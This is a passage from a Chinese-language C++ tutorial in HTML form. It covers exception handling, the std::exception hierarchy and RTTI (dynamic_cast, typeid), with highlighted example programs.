class="keyword">void</span> <span class="title">process_resource</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="keyword">int</span>&gt; <span class="title">p_res</span><span class="params">(<span class="keyword">new</span> <span class="keyword">int</span>(<span class="number">10</span>))</span></span>; <span class="comment">// RAII: 资源由 unique_ptr 管理</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... 使用 p_res ...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="comment">/* some error condition */</span> <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="built_in">std</span>::runtime_error(<span class="string">&quot;Something went wrong in process_resource&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... 更多代码 ...</span></span><br><span class="line"></span><br><span class="line">&#125; <span class="comment">// 如果正常结束，p_res 在这里销毁，释放内存</span></span><br><span class="line">  <span class="comment">// 如果抛出异常，栈解退时 p_res 也会被销毁，释放内存</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">caller</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        process_resource();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">const</span> <span class="built_in">std</span>::runtime_error&amp; e) &#123;</span><br><span class="line">        <span class="comment">// 处理异常</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意:</strong> 如果在栈解退过程中，某个对象的析构函数<strong>自身</strong>抛出了异常，而此时已经有一个异常正在处理中，程序会调用 <code>std::terminate()</code>。因此，<strong>析构函数应该避免抛出异常</strong>（通常应声明为 <code>noexcept</code>）。</p><h3 id="15-3-7-其他异常特性"><a href="#15-3-7-其他异常特性" class="headerlink" title="15.3.7 其他异常特性"></a>15.3.7 其他异常特性</h3><ul><li><p><strong>重新抛出异常 (<code>throw;</code>):</strong> 在 <code>catch</code> 块内部，可以使用不带任何操作数的 <code>throw;</code> 语句将<strong>当前捕获到的异常</strong>重新抛出，交由外层的 <code>catch</code> 块处理。这允许一个 <code>catch</code> 块执行部分处理（如记录日志），然后将异常传递给更高层进行进一步处理。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">catch</span> (<span class="keyword">const</span> MyException&amp; e) &#123;</span><br><span class="line">    log_error(e.what()); <span class="comment">// 记录错误</span></span><br><span class="line">    <span class="keyword">if</span> (can_handle_partially(e)) &#123;</span><br><span class="line">        <span class="comment">// ... 部分处理 ...</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span>; <span class="comment">// 重新抛出原始异常，让外层处理</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>捕获所有异常 (<code>catch(...)</code>):</strong> <code>catch(...)</code> 可以捕获任何类型的异常。它通常放在所有其他 <code>catch</code> 块的最后，用于进行最终的清理或记录未知错误。在 <code>catch(...)</code> 块内部无法知道捕获到的异常的具体类型和信息（除非重新抛出给外层）。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">catch</span> (...) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Caught an unexpected exception type!\n&quot;</span>;</span><br><span class="line">    <span class="comment">// 可能进行一些通用清理</span></span><br><span class="line">    <span class="comment">// throw; // 可以重新抛出，如果外层可能知道如何处理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="15-3-8-exception-类"><a href="#15-3-8-exception-类" class="headerlink" title="15.3.8 exception 类"></a>15.3.8 exception 类</h3><p>C++ 标准库在 <code>&lt;exception&gt;</code> 头文件中定义了一个标准的异常基类 <code>std::exception</code>。标准库抛出的许多异常（如 <code>std::bad_alloc</code>, <code>std::bad_cast</code>, <code>std::runtime_error</code>, <code>std::logic_error</code> 等）都直接或间接从此类派生。</p><p><code>std::exception</code> 提供了一个重要的虚成员函数：</p><ul><li><code>virtual const char* what() const noexcept;</code><ul><li>  返回一个描述异常的 C 风格字符串。派生类通常会覆盖此方法以提供更具体的错误信息。</li></ul></li></ul><p>建议自定义的异常类也继承自 <code>std::exception</code> 或其派生类，这样可以更容易地与标准库异常和通用的异常处理代码集成。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdexcept&gt; // 包含 runtime_error, logic_error 等</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyLogicError</span> :</span> <span class="keyword">public</span> <span class="built_in">std</span>::logic_error &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">MyLogicError</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; what_arg)</span></span></span><br><span class="line"><span class="function">        : <span class="title">std::logic_error</span><span class="params">(what_arg)</span> </span>&#123;&#125;</span><br><span class="line">    <span class="comment">// what() 会继承 std::logic_error 的实现，返回构造时传入的字符串</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> MyLogicError(<span class="string">&quot;Custom logic error occurred&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (<span class="keyword">const</span> <span class="built_in">std</span>::exception&amp; e) &#123; <span class="comment">// 捕获所有标准异常及派生类</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Caught standard exception: &quot;</span> &lt;&lt; e.what() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>标准异常类层次结构（部分）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">std::exception</span><br><span class="line">  ├── std::logic_error</span><br><span class="line">  │     ├── std::domain_error</span><br><span class="line">  │     ├── std::invalid_argument</span><br><span class="line">  │     ├── std::length_error</span><br><span class="line">  │     └── std::out_of_range</span><br><span class="line">  ├── std::runtime_error</span><br><span class="line">  │     ├── std::overflow_error</span><br><span class="line">  │     ├── std::underflow_error</span><br><span class="line">  │     ├── std::range_error</span><br><span class="line">  │     └── std::system_error (C++11)</span><br><span class="line">  ├── std::bad_alloc      (new 失败)</span><br><span class="line">  ├── std::bad_cast       (dynamic_cast 到引用失败)</span><br><span class="line">  ├── std::bad_typeid     (typeid 用于空指针)</span><br><span class="line">  └── std::bad_exception  (处理 unexpected() 时可能抛出)</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><h3 id="15-3-9-异常、类和继承"><a href="#15-3-9-异常、类和继承" class="headerlink" title="15.3.9 异常、类和继承"></a>15.3.9 异常、类和继承</h3><p>异常处理机制与类和继承良好地交互：</p><ul><li>  <strong>类对象作为异常:</strong> 如前所述，推荐使用类对象。</li><li>  <strong>继承层次:</strong> 可以捕获基类异常来处理派生类异常。</li><li>  <strong>构造函数中的异常:</strong> 如果构造函数在对象完全构造好之前抛出异常，该对象的析构函数<strong>不会</strong>被调用。但是，已经<strong>完全构造好</strong>的成员对象和基类子对象的析构函数会按照构造相反的顺序被调用（栈解退的一部分）。因此，构造函数需要特别注意资源管理，最好使用 RAII 成员（如智能指针）来避免资源泄漏。</li><li>  <strong>析构函数中的异常:</strong> 析构函数<strong>不应该</strong>抛出异常。如果析构函数在栈解退过程中抛出异常，会导致 <code>std::terminate()</code>。如果析构函数内部的操作可能失败，应将失败信息记录下来或提供其他查询方式，而不是抛出异常。</li></ul><h3 id="15-3-10-异常何时会迷失方向-Uncaught-Exceptions"><a href="#15-3-10-异常何时会迷失方向-Uncaught-Exceptions" class="headerlink" title="15.3.10 异常何时会迷失方向 (Uncaught Exceptions)"></a>15.3.10 异常何时会迷失方向 (Uncaught Exceptions)</h3><p>如果一个异常被抛出后，沿着调用栈一直传播到 <code>main</code> 函数之外都没有被任何 <code>catch</code> 块捕获，这个异常就称为**未捕获异常 (Uncaught Exception)**。</p><p>当发生未捕获异常时，C++ 运行时系统会调用 <code>std::terminate()</code> 函数（定义在 <code>&lt;exception&gt;</code> 中）。<code>std::terminate()</code> 的默认行为是调用 <code>std::abort()</code>，导致程序异常终止。</p><p>可以通过 <code>std::set_terminate()</code> 函数来注册一个自定义的终止处理程序，在 <code>std::terminate()</code> 被调用时执行一些自定义操作（如记录日志），但这个自定义处理程序最终也必须终止程序（例如通过调用 <code>abort()</code> 或 <code>exit()</code>），不能返回。</p><h3 id="15-3-11-有关异常的注意事项"><a href="#15-3-11-有关异常的注意事项" class="headerlink" title="15.3.11 有关异常的注意事项"></a>15.3.11 有关异常的注意事项</h3><ul><li>  <strong>性能:</strong> 异常处理机制（特别是 <code>throw</code> 和栈解退）通常比返回错误码有更高的运行时开销。因此，异常应该用于处理<strong>异常</strong>情况，而不是用于正常的程序流程控制。对于预期会频繁发生的“错误”（如用户输入格式错误），可能使用错误码或其他方式更合适。</li><li><strong>异常安全 (Exception Safety):</strong> 编写在发生异常时仍能保持正确状态（例如，不泄漏资源、保持数据一致性）的代码非常重要。RAII 是实现异常安全的关键技术。函数通常追求以下几种异常安全保证级别（从弱到强）：<ol><li> <strong>基本保证 (Basic Guarantee):</strong> 操作失败时，对象保持在某个有效状态（不一定和操作前相同），没有资源泄漏。</li><li> <strong>强保证 (Strong Guarantee):</strong> 操作失败时，对象的状态回滚到操作开始之前的状态（事务性）。</li><li> <strong>不抛出保证 (Nothrow Guarantee):</strong> 操作保证不会抛出任何异常 (<code>noexcept</code>)。</li></ol></li><li>  <strong>析构函数:</strong> 绝对不要让析构函数抛出异常。</li><li>  <strong>构造函数:</strong> 谨慎处理构造函数中的异常，使用 RAII 管理资源。</li><li>  <strong>何时使用:</strong> 异常最适合处理那些阻止函数完成其预期任务的、不常见的错误情况，特别是当错误发生在深层嵌套调用中，需要将错误信息传递给高层调用者时。</li></ul><p>异常处理是 C++ 中一个强大的错误处理工具，但也需要谨慎使用，并结合 RAII 等技术来确保程序的健壮性和资源的正确管理。</p><h2 id="15-4-RTTI（运行时类型识别）"><a href="#15-4-RTTI（运行时类型识别）" class="headerlink" title="15.4 RTTI（运行时类型识别）"></a>15.4 RTTI（运行时类型识别）</h2><p><strong>RTTI</strong> 是 <strong>Runtime Type Identification</strong> 的缩写，即<strong>运行时类型识别</strong>。它是 C++ 的一项机制，允许程序在<strong>运行时</strong>发现和使用对象的<strong>实际类型信息</strong>。</p><p>通常，我们通过基类指针或引用来操作派生类对象（多态）。在这种情况下，代码只关心对象是否符合基类定义的接口。但有时，我们可能需要知道指针或引用实际指向的对象的<strong>确切派生类型</strong>，以便执行该派生类特有的操作。RTTI 就是为了解决这类问题而设计的。</p><p>RTTI 主要通过以下三个元素实现：</p><ol><li> <strong><code>dynamic_cast&lt;&gt;</code> 运算符:</strong> 用于在类层次结构中进行**安全的向下转换 (Downcasting)**。它可以将基类指针或引用转换为派生类指针或引用，并在转换无效时提供明确的失败指示。</li><li> <strong><code>typeid()</code> 运算符:</strong> 返回一个指向 <code>std::type_info</code> 对象的引用，该对象包含了关于操作数类型的信息（如类型名称）。</li><li> <strong><code>std::type_info</code> 类:</strong> 存储特定类型信息的类。其具体内容因编译器而异，但标准保证它有一个 <code>name()</code> 方法返回类型的名称字符串，并可以比较两个 <code>type_info</code> 对象是否相等。</li></ol><p><strong>注意:</strong> RTTI 主要用于<strong>具有虚函数</strong>的类层次结构（即多态类）。对于没有虚函数的类，RTTI 的功能会受到限制（特别是 <code>dynamic_cast</code> 对指针的操作和 <code>typeid</code> 对解引用指针的操作）。编译器通常通过虚函数表 (vtable) 来存储 RTTI 所需的信息。</p><h3 id="15-4-1-RTTI-的用途"><a href="#15-4-1-RTTI-的用途" class="headerlink" title="15.4.1 RTTI 的用途"></a>15.4.1 RTTI 的用途</h3><p>RTTI 主要用于以下场景：</p><ul><li>  <strong>安全的向下转换:</strong> 当你有一个基类指针或引用，并且你怀疑它可能指向某个特定的派生类对象，你想安全地将其转换为该派生类指针或引用，以便调用派生类特有的方法。</li><li>  <strong>类型相关的特殊处理:</strong> 根据对象的实际类型执行不同的逻辑分支。</li></ul><p><strong>替代方案:</strong> 应该优先考虑使用<strong>虚函数</strong>来实现多态行为。如果不同的派生类需要以不同的方式执行某个操作，通常更好的设计是定义一个虚函数，让每个派生类提供自己的实现，而不是使用 RTTI 来判断类型并手动调用不同的代码。RTTI 往往被视为一种最后的手段，或者在特定框架（如图形界面库中的事件处理）中可能更常用。过度使用 RTTI 可能表明类设计存在问题。</p><h3 id="15-4-2-RTTI-的工作原理"><a href="#15-4-2-RTTI-的工作原理" class="headerlink" title="15.4.2 RTTI 的工作原理"></a>15.4.2 RTTI 的工作原理</h3><h4 id="1-dynamic-cast-lt-gt-运算符"><a href="#1-dynamic-cast-lt-gt-运算符" class="headerlink" title="1. dynamic_cast&lt;&gt; 运算符"></a>1. <code>dynamic_cast&lt;&gt;</code> 运算符</h4><p><code>dynamic_cast</code> 用于在继承层次结构中进行类型转换，特别是在运行时检查转换的有效性。</p><p><strong>语法:</strong></p><ul><li>  <strong>指针转换:</strong> <code>dynamic_cast&lt;TargetType*&gt;(source_pointer)</code></li><li>  <strong>引用转换:</strong> <code>dynamic_cast&lt;TargetType&amp;&gt;(source_reference)</code></li></ul><p><strong>行为:</strong></p><ul><li>  <strong>向上转换 (Upcasting):</strong> 将派生类指针/引用转换为基类指针/引用。<code>dynamic_cast</code> 可以执行此操作，但通常不需要，因为隐式转换即可。</li><li><strong>向下转换 (Downcasting):</strong> 将基类指针/引用转换为派生类指针/引用。这是 <code>dynamic_cast</code> 的主要用途。<ul><li>  <strong>前提:</strong> 基类<strong>必须</strong>包含至少一个虚函数（即是多态基类），<code>dynamic_cast</code> 才能执行运行时的向下转换检查。如果基类没有虚函数，<code>dynamic_cast</code> 用于向下转换时通常会导致编译错误（或行为类似 <code>static_cast</code>，不安全）。</li><li><strong>指针转换:</strong><ul><li>  如果 <code>source_pointer</code> 确实指向一个 <code>TargetType</code> 类型的对象（或者是 <code>TargetType</code> 的派生类对象），则转换成功，返回指向该对象的 <code>TargetType*</code> 指针。</li><li>  如果 <code>source_pointer</code> 指向的对象<strong>不是</strong> <code>TargetType</code> 类型（或其派生类），或者 <code>source_pointer</code> 是 <code>nullptr</code>，则转换失败，返回 **<code>nullptr</code>**。</li></ul></li><li><strong>引用转换:</strong><ul><li>  如果 <code>source_reference</code> 确实引用一个 <code>TargetType</code> 类型的对象（或者是 <code>TargetType</code> 的派生类对象），则转换成功，返回对该对象的 <code>TargetType&amp;</code> 引用。</li><li>  如果 <code>source_reference</code> 引用的对象<strong>不是</strong> <code>TargetType</code> 类型（或其派生类），则转换失败，抛出 <strong><code>std::bad_cast</code> 异常</strong>（定义在 <code>&lt;typeinfo&gt;</code> 中）。</li></ul></li></ul></li></ul><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt; // for rand(), srand()</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctime&gt;   // for time()</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;typeinfo&gt; // for bad_cast</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdexcept&gt; // for exception</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Grand</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> hold;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Grand(<span class="keyword">int</span> h = <span class="number">0</span>) : hold(h) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Speak</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am a grand class!\n&quot;</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">Value</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> hold; &#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~Grand() &#123;&#125; <span class="comment">// 虚析构函数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Superb</span> :</span> <span class="keyword">public</span> Grand &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Superb(<span class="keyword">int</span> h = <span class="number">0</span>) : Grand(h) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Speak</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am a superb class!!\n&quot;</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Say</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I hold the superb value of &quot;</span> &lt;&lt; Value() &lt;&lt; <span class="string">&quot;!\n&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Magnificent</span> :</span> <span class="keyword">public</span> Superb &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Magnificent(<span class="keyword">int</span> h = <span class="number">0</span>, <span class="keyword">char</span> c = <span class="string">&#x27;A&#x27;</span>) : Superb(h), ch(c) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Speak</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am a magnificent class!!!\n&quot;</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Say</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I hold the magnificent value of &quot;</span> &lt;&lt; Value() &lt;&lt; <span class="string">&quot; and the character &quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;!\n&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：随机生成一个指向 Grand, Superb 或 Magnificent 对象的指针</span></span><br><span class="line"><span class="function">Grand * <span class="title">GetOne</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Grand * p = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="built_in">std</span>::rand() % <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>: p = <span class="keyword">new</span> Grand(<span class="built_in">std</span>::rand() % <span class="number">100</span>); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>: p = <span class="keyword">new</span> Superb(<span class="built_in">std</span>::rand() % <span class="number">100</span>); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>: p = <span class="keyword">new</span> Magnificent(<span class="built_in">std</span>::rand() % <span class="number">100</span>, <span class="string">&#x27;A&#x27;</span> + <span class="built_in">std</span>::rand() % <span class="number">26</span>); <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::srand(<span class="built_in">std</span>::time(<span class="number">0</span>));</span><br><span class="line">    Grand * pg;</span><br><span class="line">    Superb * ps;</span><br><span class="line">    Magnificent * pm;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        pg = GetOne(); <span class="comment">// 获取一个随机类型的对象指针</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Now processing type #&quot;</span> &lt;&lt; i+<span class="number">1</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        pg-&gt;Speak(); <span class="comment">// 调用虚函数，总是正确的</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 尝试向下转换为 Superb*</span></span><br><span class="line">        ps = <span class="keyword">dynamic_cast</span>&lt;Superb *&gt;(pg);</span><br><span class="line">        <span class="keyword">if</span> (ps != <span class="literal">nullptr</span>) &#123; <span class="comment">// 检查转换是否成功</span></span><br><span class="line">            ps-&gt;Say(); <span class="comment">// 如果是 Superb 或 Magnificent，可以调用 Say()</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; (Not a Superb or derived type)\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 尝试向下转换为 Magnificent*</span></span><br><span class="line">        pm = <span class="keyword">dynamic_cast</span>&lt;Magnificent *&gt;(pg);</span><br><span class="line">        <span class="keyword">if</span> (pm != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">             <span class="comment">// 如果是 Magnificent，可以调用 Say() (这里会调用 Magnificent 的版本)</span></span><br><span class="line">             <span class="comment">// pm-&gt;Say(); // 可以调用，但上面 Superb* 的 Say() 已经调用过了</span></span><br><span class="line">             <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;   (Also a Magnificent type)\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 尝试使用引用转换 (如果失败会抛异常)</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Superb &amp; rs = <span class="keyword">dynamic_cast</span>&lt;Superb &amp;&gt;(*pg); <span class="comment">// 尝试转换为 Superb 引用</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Reference cast to Superb successful.\n&quot;</span>;</span><br><span class="line">            <span class="comment">// rs.Say(); // 可以调用</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">const</span> <span class="built_in">std</span>::bad_cast &amp; bc) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Reference cast to Superb failed: &quot;</span> &lt;&lt; bc.what() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">delete</span> pg; <span class="comment">// 清理内存 (需要虚析构函数)</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--------------------\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-typeid-运算符"><a href="#2-typeid-运算符" class="headerlink" title="2. typeid() 运算符"></a>2. <code>typeid()</code> 运算符</h4><p><code>typeid</code> 运算符返回一个 <code>const std::type_info&amp;</code> 对象，表示其操作数的类型。</p><p><strong>语法:</strong></p><ul><li>  <code>typeid(expression)</code>: 返回表达式 <code>expression</code> 的<strong>运行时</strong>类型信息（如果表达式是解引用的多态指针或引用）。如果表达式不是多态类型，则返回其<strong>静态</strong>类型信息。</li><li>  <code>typeid(type-name)</code>: 返回类型 <code>type-name</code> 的类型信息。</li></ul><p><strong><code>std::type_info</code> 类:</strong></p><ul><li>  <strong><code>name()</code>:</strong> 返回一个实现定义的 C 风格字符串，表示类型的名称。名称的具体格式（例如是否包含命名空间、是否经过“修饰”/mangled）没有统一标准。</li><li>  <strong><code>operator==</code>:</strong> 可以比较两个 <code>type_info</code> 对象是否代表同一类型。</li><li>  <strong><code>operator!=</code>:</strong> 可以比较两个 <code>type_info</code> 对象是否代表不同类型。</li><li>  <strong><code>before()</code>:</strong> 用于确定一个类型在编译器的内部排序顺序中是否位于另一个类型之前（用途较少）。</li></ul><p><strong>注意:</strong></p><ul><li>  要使用 <code>typeid</code> 和 <code>type_info</code>，需要包含 <code>&lt;typeinfo&gt;</code> 头文件。</li><li>  如果 <code>typeid</code> 的操作数是一个**空指针 (nullptr)**，它会抛出 <code>std::bad_typeid</code> 异常。</li><li>  如果 <code>typeid</code> 用于非多态类型（没有虚函数）的指针解引用，它返回的是指针的<strong>静态类型</strong>信息，而不是实际指向对象的类型信息。</li></ul><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 